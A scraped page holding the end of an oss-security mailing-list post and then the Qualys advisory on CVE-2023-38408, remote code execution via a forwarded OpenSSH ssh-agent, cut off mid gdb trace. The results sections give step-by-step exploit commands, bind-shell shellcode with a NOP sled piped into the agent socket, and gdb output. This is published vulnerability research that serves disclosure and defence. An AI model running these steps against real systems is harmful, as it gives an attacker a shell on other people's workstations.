that, then why would we be subjecting other distros (non-illumos)
applying on their own to these same criteria, or would we relax for all?

Please correct me if I misunderstood something, or/and suggest a way
forward (either fully consistent with the constraints above or with
specific changes you'd propose and the community would find reasonable).

Thanks,

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.qualys.com_66b0d945_20250110_133632.html ===

Qualys Security Advisory
CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent
========================================================================
Contents
========================================================================
Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
"ssh-agent is a program to hold private keys used for public key
authentication. Through use of environment variables the agent can
be located and automatically used for authentication when logging in
to other machines using ssh(1). ... Connections to ssh-agent may be
forwarded from further remote hosts using the -A option to ssh(1)
(but see the caveats documented therein), avoiding the need for
authentication data to be stored on other machines."
(https://man.openbsd.org/ssh-agent.1)
"Agent forwarding should be enabled with caution. Users with the
ability to bypass file permissions on the remote host ... can access
the local agent through the forwarded connection. ... A safer
alternative may be to use a jump host (see -J)."
(https://man.openbsd.org/ssh.1)
Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.
While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib\* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE\_PKCS11, which is the default).
(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)
Although this seems safe at first (because every shared library in
/usr/lib\* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.
Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib\*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):
- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
looked into any other versions, distributions, or operating systems;
- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
and we ran it intermittently on a single laptop, so we have not tried
all the combinations of shared libraries and side effects;
- we initially had only one attack vector in mind (i.e., one specific
combination of side effects from shared libraries), but we discovered
six more while analyzing the results of our fuzzer, and we are
convinced that more attack vectors exist.
In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
https://www.qualys.com/research/security-advisories/ (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).
========================================================================
Background
========================================================================
The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C\_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib\*).
Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.
Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib\*/\*,/usr/local/lib\*/\*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
https://bugs.chromium.org/p/project-zero/issues/detail?id=1009):
- if an attacker had access to the server where Alice's ssh-agent is
forwarded to, and had an unprivileged access to Alice's workstation,
then this attacker could store a malicious shared library in /tmp on
Alice's workstation and execute it with Alice's privileges (via her
forwarded ssh-agent) -- a mild form of Local Privilege Escalation;
- if the attacker had only access to the server where Alice's ssh-agent
is forwarded to, but could somehow store a malicious shared library
somewhere on Alice's workstation (without access to her workstation),
then this attacker could remotely execute this shared library (via
Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.
Our first reaction was of course to try to bypass ssh-agent's /usr/lib\*
allow-list:
- by finding a logic bug in the filter function, match\_pattern\_list()
(but we failed);
- by making a path-traversal attack, for example /usr/lib/../../tmp (but
we failed, because ssh-agent first calls realpath() to canonicalize
the path of a shared library, and then calls the filter function);
- by finding a locally or remotely writable file or directory in
/usr/lib\* (but we failed).
Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib\*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
https://seclists.org/fulldisclosure/2010/Oct/344):
- an unprivileged local attacker could dlopen() any shared library from
/lib and /usr/lib (via the LD\_AUDIT environment variable), even when
executing a SUID-root program;
- the constructor functions of various common shared libraries created
files and directories whose location depended on the attacker's
environment variables and whose creation mode depended on the
attacker's umask;
- the local attacker could therefore create world-writable files and
directories anywhere in the filesystem, and obtain full root
privileges (via crond, for example).
Although the ability to load and unload shared libraries from /usr/lib\*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).
In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib\* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:
------------------------------------------------------------------------
1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU\_STACK ELF header,
or implicitly because of a missing GNU\_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().
For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.
------------------------------------------------------------------------
2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.
For example, /usr/lib/x86\_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.
------------------------------------------------------------------------
3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).
For example, /usr/lib/x86\_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.
------------------------------------------------------------------------
4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.
For example, most of the /usr/lib/x86\_64-linux-gnu/xtables/lib\*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.
------------------------------------------------------------------------
And so an exciting idea to remotely exploit ssh-agent came into our
mind:
a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;
b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);
c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");
d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);
e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.
========================================================================
Experiments
========================================================================
But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:
------------------------------------------------------------------------
Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib\* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.
Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib\* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.
------------------------------------------------------------------------
Step 2 - For each shared library in /usr/lib\*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.
------------------------------------------------------------------------
Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:
- 58 shared libraries make the stack executable when dlopen()ed (and the
stack remains executable even after dlclose());
- 16577 shared libraries permanently alter the mmap layout when
dlopen()ed (either because they are "nodelete" libraries, or because
they allocate a thread stack or otherwise leak mmap()ed memory);
- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
not deregister it when dlclose()d), and 238 shared libraries raise a
SIGSEGV when dlopen()ed;
- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
shared libraries raise a SIGABRT when dlopen()ed.
On Ubuntu Desktop 21.10:
- 30 shared libraries make the stack executable;
- 16172 shared libraries permanently alter the mmap layout;
- 9 shared libraries register a SIGSEGV handler, and 147 shared
libraries raise a SIGSEGV;
- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
raise a SIGABRT;
- 1 shared library registers a SIGBUS handler, and 11 shared libraries
raise a SIGBUS;
- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
raise a SIGCHLD;
- 1 shared library registers a SIGILL handler, and 1 shared library
raises a SIGILL.
------------------------------------------------------------------------
Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:
a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;
b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);
c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);
d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV\_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.
Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.
------------------------------------------------------------------------
Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:
a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;
b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;
c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.
Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).
------------------------------------------------------------------------
Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:
a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);
b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.
========================================================================
Results
========================================================================
In this section, we present the results of our experiments:
- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- \_Unwind\_Context type-confusion
- RCE in library constructor
========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================
This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.
------------------------------------------------------------------------
1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso),
without connecting this workstation to the Internet.
------------------------------------------------------------------------
1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:
workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list
------------------------------------------------------------------------
1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:
workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5
------------------------------------------------------------------------
2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
workstation$ eval `ssh-agent -s`
Agent pid 1105
workstation$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-XXXXXXmgHTo9/agent.1104
workstation$ ssh -A server
server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
server$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-N5EjHljGRh/agent.1299
------------------------------------------------------------------------
3/ Then, as a remote attacker who has access to this server:
------------------------------------------------------------------------
3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):
server# echo /tmp/ssh-\*/agent.\*
/tmp/ssh-N5EjHljGRh/agent.1299
server# export SSH\_AUTH\_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299
server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation
------------------------------------------------------------------------
3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:
server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH\_AUTH\_SOCK"
[Press Ctrl-C after a few seconds.]
- we do not use ssh-add here, because we want to send a ~10KB passphrase
(our shellcode) to ssh-agent, but ssh-add limits the length of our
passphrase to 1KB;
- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
instruction);
- SHELLCODE is a "TCP bind shell" on port 31337 (from
https://shell-storm.org/shellcode/files/shellcode-858.html);
- /usr/lib/modules is an existing directory whose path matches
ssh-agent's /usr/lib\* allow-list (indeed, we do not want to actually
load a shared library here -- we just want to store our shellcode in
the executable stack);
------------------------------------------------------------------------
3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:
server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation
------------------------------------------------------------------------
3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86\_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation
------------------------------------------------------------------------
3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:
server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/\*] succeeded!
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
workstation$ ps axuf
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
...
alice 1105 0.0 0.1 7968 4192 ? Ss 09:48 0:00 ssh-agent -s
alice 1249 0.0 0.0 2888 956 ? S 10:03 0:00 \\_ [sh]
alice 1268 0.0 0.0 7204 3092 ? R 10:14 0:00 \\_ ps axuf
------------------------------------------------------------------------
To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:
workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::\_Rb\_tree\_decrement(std::\_Rb\_tree\_node\_base\*) () from /lib/x86\_64-linux-gnu/libstdc++.so.6
(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86\_64-linux-gnu/libQt5Widgets.so.5
(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250: add %rcx,%rdx
0x7fb15d0e1253: notrack jmp \*%rdx
...
(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86\_64-linux-gnu/libQt5Widgets.so.5
(gdb) stepi
0x00007ffc2ec82691 in ?? ()
(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691: nop
0x7ffc2ec82692: nop
0x7ffc2ec82693: nop
0x7ffc2ec82694: nop
0x7ffc2ec82695: nop
0x7ffc2ec82696: nop
0x7ffc2ec82697: nop
0x7ffc2ec82698: nop
0x7ffc2ec82699: nop
0x7ffc2ec8269a: nop
(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0 [stack]
========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================
In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.
------------------------------------------------------------------------
1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso),
without connecting this workstation to the Internet.
------------------------------------------------------------------------
1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:
workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb https://old-releases.ubuntu.com/ubuntu/ impish main restricted universe' > /etc/apt/sources.list
------------------------------------------------------------------------
1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:
workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg
------------------------------------------------------------------------
2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)
workstation$ eval `ssh-agent -s`
Agent pid 912
workstation$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-GnpGKph6xbe3/agent.911
workstation$ ssh -A server
server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
server$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-30N8pjTKWn/agent.996
------------------------------------------------------------------------
3/ Then, as a remote attacker who has access to this server:
------------------------------------------------------------------------
3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:
server# echo /tmp/ssh-\*/agent.\*
/tmp/ssh-30N8pjTKWn/agent.996
server# export SSH\_AUTH\_SOCK=/tmp/ssh-30N8pjTKWn/agent.996
server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation
------------------------------------------------------------------------
3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:
server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH\_AUTH\_SOCK"
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:
server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation
------------------------------------------------------------------------
3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libgnatcoll\_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86\_64-linux-gnu/libgnatcoll\_postgres.so.1": agent refused operation
------------------------------------------------------------------------
3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:
server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex\_data.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libxkbregistry.so.0.0.0
------------------------------------------------------------------------
3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:
server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]
------------------------------------------------------------------------
3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:
server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/\*] succeeded!
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)
workstation$ ps axuf
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
...
alice 912 0.0 0.0 6060 2312 ? Ss 17:18 0:00 ssh-agent -s
alice 928 0.0 0.0 2872 956 ? S 17:25 0:00 \\_ [sh]
alice 953 0.0 0.0 7060 3068 ? R 17:40 0:00 \\_ ps axuf
------------------------------------------------------------------------
To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:
workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.
Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86\_64/multiarch/memset-vec-unaligned-erms.S:186
(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno\_cppuhelpergcc3.so.3
(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350: add $0x28,%rsp
0x7f2ba9d7c354: mov %r12,%rax
0x7f2ba9d7c357: pop %rbx
0x7f2ba9d7c358: pop %rbp
0x7f2ba9d7c359: pop %r12
0x7f2ba9d7c35b: pop %r13
0x7f2ba9d7c35d: pop %r14
0x7f2ba9d7c35f: pop %r15
0x7f2ba9d7c361: ret
...
(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno\_cppuhelpergcc3.so.3
(gdb) stepi
0x00007fff7aae5e90 in ?? ()
(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90: add %dl,(%rax)
0x7fff7aae5e92: and %eax,(%rax)
0x7fff7aae5e94: add %al,(%rax)
0x7fff7aae5e96: add %al,(%rax)
0x7fff7aae5e98: add %ah,(%rax)
0x7fff7aae5e9a: and %eax,(%rax)
0x7fff7aae5e9c: add %al,(%rax)
0x7fff7aae5e9e: add %al,(%rax)
0x7fff7aae5ea0: call 0x7fff7aae7fbe
...
(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()
(gdb) stepi
0x00007fff7aae7fbe in ?? ()
(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe: nop
0x7fff7aae7fbf: nop
